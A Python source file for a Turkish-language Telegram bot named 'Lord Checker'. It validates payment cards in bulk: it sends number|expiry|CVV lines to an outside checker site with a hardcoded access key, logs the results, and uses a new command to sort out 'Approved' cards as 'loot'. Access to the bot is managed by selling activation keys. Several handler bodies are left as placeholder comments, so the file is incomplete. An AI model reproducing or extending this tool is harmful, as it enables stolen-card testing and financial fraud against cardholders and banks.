# --- DOSYA: main.py (v35 - Ganimet Tasnif Sistemi) ---
# /ayikla komutu eklendi.

import logging, requests, time, os, re, json, io
from urllib.parse import quote
from datetime import datetime
from flask import Flask
from threading import Thread

from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import Forbidden, BadRequest

# Bütün class'lar ve diğer fonksiyonlar aynı kalıyor.
# Değişiklikler sadece start_command, document_handler ve main fonksiyonlarında.
# Kopyala yapıştır kolaylığı için hepsini tekrar veriyorum.

# --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
app = Flask('')
@app.route('/')
def home(): return "Lord Checker Karargahı ayakta."
def run_flask(): app.run(host='0.0.0.0',port=8080)
def keep_alive(): Thread(target=run_flask).start()

# --- BÖLÜM 2: GİZLİ BİLGİLER ---
try:
    from bot_token import TELEGRAM_TOKEN, ADMIN_ID
except ImportError:
    print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()

# -----------------------------------------------------------------------------
# 3. BİRİM: İSTİHBARAT & OPERASYON
# -----------------------------------------------------------------------------
class PuanChecker:
    def __init__(self, key):
        self.login_url = "https://kaderchecksystem.xyz/"
        self.key = key
        self.target_api_url = "https://kaderchecksystem.xyz/xrayefe.php"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
        self.timeout = 25
    def login(self) -> bool:
        try:
            response = self.session.post(self.login_url, data={'key': self.key}, timeout=self.timeout)
            return response.ok and "GİRİŞ YAP" not in response.text
        except requests.exceptions.RequestException as e:
            logging.error(f"PuanChecker giriş hatası: {e}"); return False
    def check_card(self, card):
        try:
            formatted_card = quote(card)
            full_url = f"{self.target_api_url}?card={formatted_card}"
            response = self.session.get(full_url, timeout=self.timeout)
            return response.text.strip()
        except requests.exceptions.RequestException as e: return f"HATA: {e}"

# -----------------------------------------------------------------------------
# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
# -----------------------------------------------------------------------------
class UserManager:
    def __init__(self, initial_admin_id):
        self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
        self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
        self.unused_keys = self._load_from_file(self.keys_file)
        self.activated_users = self._load_from_json(self.activated_users_file)
        self.unused_admin_keys = self._load_from_file(self.admin_keys_file)
        self.activated_admins = self._load_from_json(self.activated_admins_file)
        if not self.activated_admins and initial_admin_id != 0:
             self.activated_admins[str(initial_admin_id)] = "founding_father"
             logging.info(f"Kurucu Komutan (ID: {initial_admin_id}) admin olarak atandı."); self._save_all_data()
    def _load_from_file(self, filename):
        if not os.path.exists(filename): return set()
        with open(filename, "r") as f: return {line.strip() for line in f if line.strip()}
    def _load_from_json(self, filename):
        if not os.path.exists(filename): return {}
        with open(filename, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except json.JSONDecodeError: return {}
    def _save_all_data(self):
        with open(self.keys_file, "w") as f: f.write("\n".join(self.unused_keys))
        with open(self.activated_users_file, "w") as f: json.dump(self.activated_users, f, indent=4)
        with open(self.admin_keys_file, "w") as f: f.write("\n".join(self.unused_admin_keys))
        with open(self.activated_admins_file, "w") as f: json.dump(self.activated_admins, f, indent=4)
    def is_user_activated(self, user_id): return str(user_id) in self.activated_users or self.is_user_admin(user_id)
    def is_user_admin(self, user_id): return str(user_id) in self.activated_admins
    def activate_user(self, user_id, key):
        if self.is_user_activated(str(user_id)): return "Zaten bir Lord'sun."
        if key in self.unused_keys:
            self.activated_users[str(user_id)] = key; self.unused_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış anahtar."
    def activate_admin(self, user_id, key):
        if self.is_user_admin(str(user_id)): return "Zaten Komuta Kademesindesin."
        if key in self.unused_admin_keys:
            self.activated_admins[str(user_id)] = key; self.unused_admin_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış Vezir Fermanı."

# -----------------------------------------------------------------------------
# 5. BİRİM: EMİR SUBAYLARI (Handlers)
# -----------------------------------------------------------------------------
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
def log_activity(user: User, card: str, result: str):
    masked_card = re.sub(r'(\d{6})\d{6}(\d{4})', r'\1******\2', card.split('|')[0]) + '|' + '|'.join(card.split('|')[1:])
    log_entry = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] - KULLANICI: @{user.username} (ID: {user.id}) - KART: {masked_card} - SONUÇ: {result}\n"
    with open("terminator_logs.txt", "a", encoding="utf-8") as f: f.write(log_entry)
async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
    job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
    site_checker: PuanChecker = context.bot_data['puan_checker']
    await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
    report_content = "";
    for card in cards:
        result = site_checker.check_card(card); log_activity(user, card, result)
        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(0.5)
    report_file = io.BytesIO(report_content.encode('utf-8'))
    await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Raporun hazır.")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Lordum, emrindeyim!\n`/puan` komutuyla kart checkleyebilir,\n`/ayikla` komutuyla sonuçları ayıklayabilirsin.")
    else:
        await update.message.reply_text("Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
        keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
        await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))

async def puan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
    keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
    await update.message.reply_text(f"**PUAN** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def ayikla_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Yeni Ganimet Ayıklama komutu"""
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
    context.user_data['awaiting_sort_file'] = True
    await update.message.reply_text("Ganimet ayıklama emri alındı.\nİçinde karışık sonuçların olduğu `.txt` dosyasını gönder.")

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #... (kod aynı)
async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #... (kod aynı)
async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #... (kod aynı)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #... (kod aynı)

async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #... (kod aynı)

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gelen dosyaları işler. Ya toplu check içindir ya da ayıklama içindir."""
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_activated(update.effective_user.id): return

    # --- GÖREV 1: GANİMET AYIKLAMA ---
    if context.user_data.get('awaiting_sort_file'):
        await update.message.reply_text("Sonuç dosyası alındı, ayıklanıyor...")
        try:
            file = await context.bot.get_file(update.message.document)
            file_content_bytes = await file.download_as_bytearray()
            file_content = file_content_bytes.decode('utf-8')
        except Exception as e:
            await update.message.reply_text(f"Dosyayı okurken bir hata oldu: {e}"); return
        
        approved_kartlar_text = ""
        lines = file_content.splitlines()
        mevcut_kart = ""
        for line in lines:
            if line.strip().startswith("KART:"):
                mevcut_kart = line.replace("KART:", "").strip()
            elif line.strip().startswith("SONUÇ:") and "Approved" in line:
                if mevcut_kart:
                    approved_kartlar_text += mevcut_kart + "\n"
                    mevcut_kart = ""
            elif not line.strip():
                mevcut_kart = ""

        context.user_data.pop('awaiting_sort_file', None)

        if not approved_kartlar_text:
            await update.message.reply_text("ℹ️ Yolladığın dosyada 'Approved' sonuçlu kart bulunamadı."); return
            
        report_file = io.BytesIO(approved_kartlar_text.encode('utf-8'))
        await context.bot.send_document(chat_id=update.effective_user.id, document=report_file, filename="approved_kartlar.txt", caption="İşte ayıklanmış canlı kartların listesi.")
        return

    # --- GÖREV 2: TOPLU CHECK ---
    if context.user_data.get('awaiting_bulk_file'):
        await update.message.reply_text("Dosya alındı, askeri konvoy indiriliyor...")
        try:
            file = await context.bot.get_file(update.message.document); file_content_bytes = await file.download_as_bytearray()
            file_content = file_content_bytes.decode('utf-8')
        except Exception as e: await update.message.reply_text(f"Dosyayı okurken bir hata oldu: {e}"); return
        cards = []
        for line in file_content.splitlines():
            if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', line.strip()): cards.append(line.strip())
        if not cards: await update.message.reply_text("Dosyanın içinde geçerli formatta kart bulamadım."); return
        is_admin = user_manager.is_user_admin(update.effective_user.id); limit = 5000 if is_admin else 120
        if len(cards) > limit:
            await update.message.reply_text(f"DUR! Dosyadaki kart sayısı ({len(cards)}) limitini aşıyor. Senin limitin: {limit} kart."); return
        job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards}
        context.job_queue.run_once(bulk_check_job, 0, data=job_data, name=f"check_{update.effective_user.id}")
        await update.message.reply_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı...")
        context.user_data.pop('awaiting_bulk_file', None); context.user_data.pop('mode', None)

# -----------------------------------------------------------------------------
# 6. BİRİM: ANA KOMUTA MERKEZİ (main)
# -----------------------------------------------------------------------------
def main():
    if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
        print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return
    keep_alive()
    puan_checker = PuanChecker(key="47ca070e376270fff5f5ad3b75487b80")
    if not puan_checker.login(): print("UYARI: PuanChecker'a giriş yapılamadı!")
    else: print("PuanChecker birimi aktif.")
    user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
    print("Lordlar Kulübü (v35 - Ganimet Tasnif) aktif...")
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.bot_data['puan_checker'] = puan_checker
    application.bot_data['user_manager'] = user_manager_instance
    
    # Komutları ekle
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("puan", puan_command))
    application.add_handler(CommandHandler("ayikla", ayikla_command)) # YENİ KOMUT
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("duyuru", duyuru_command))
    
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, main_message_handler))
    application.add_handler(MessageHandler(filters.Document.TXT, document_handler))
    application.run_polling()

if __name__ == '__main__':
    main()
